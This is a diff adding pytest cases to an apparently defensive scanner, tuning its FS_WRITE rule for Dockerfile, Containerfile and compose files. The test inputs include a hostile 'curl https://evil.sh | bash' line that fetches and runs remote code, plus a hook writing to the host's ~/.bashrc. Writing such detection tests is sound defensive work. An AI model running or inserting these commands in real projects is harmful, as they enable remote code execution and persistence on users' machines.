@@ -142,3 +142,33 @@ class TestPyStringLiteralIsData:
     def test_real_verify_false_call_still_flags(self) -> None:
         """A real requests(..., verify=False) call still fires INSECURE_TLS."""
         assert "INSECURE_TLS" in _live("requests.post(url, json=d, verify=False)\n", "scripts/upload.py")
+
+
+class TestDockerfileFsWrite:
+    """Issue #68 Class A — FS_WRITE is a HOST-filesystem-safety rule; a Dockerfile
+    writes only inside the container image/tmpfs, so it must not fire there."""
+
+    _DOCKER = (
+        "FROM node:20\n"
+        "# the container's own .bashrc — never touches the host\n"
+        "RUN cp /home/node/.bashrc /tmp/safe\n"
+        'RUN cp /tmp/safe "$HOME/.bashrc"\n'
+    )
+
+    def test_fs_write_on_dockerfile_ext_not_flagged(self) -> None:
+        assert "FS_WRITE" not in _live(self._DOCKER, "scripts/sandbox/node-safe-chain.Dockerfile")
+
+    def test_fs_write_on_containerfile_not_flagged(self) -> None:
+        assert "FS_WRITE" not in _live(self._DOCKER, "Containerfile")
+
+    def test_fs_write_on_compose_not_flagged(self) -> None:
+        compose = "services:\n  app:\n    command: cp /a ~/.bashrc\n"
+        assert "FS_WRITE" not in _live(compose, "docker-compose.yml")
+
+    def test_real_host_write_in_shell_still_flags(self) -> None:
+        """A real write to the host's ~/.bashrc from a shell hook still fires FS_WRITE."""
+        assert "FS_WRITE" in _live("echo 'evil' > ~/.bashrc\n", "hooks/install.sh")
+
+    def test_dockerfile_supply_chain_still_flags(self) -> None:
+        """A malicious curl|bash in a Dockerfile is SUPPLY_CHAIN (not FS_WRITE) — still fires."""
+        assert "SUPPLY_CHAIN" in _live("FROM x\nRUN curl https://evil.sh | bash\n", "scripts/x.Dockerfile")
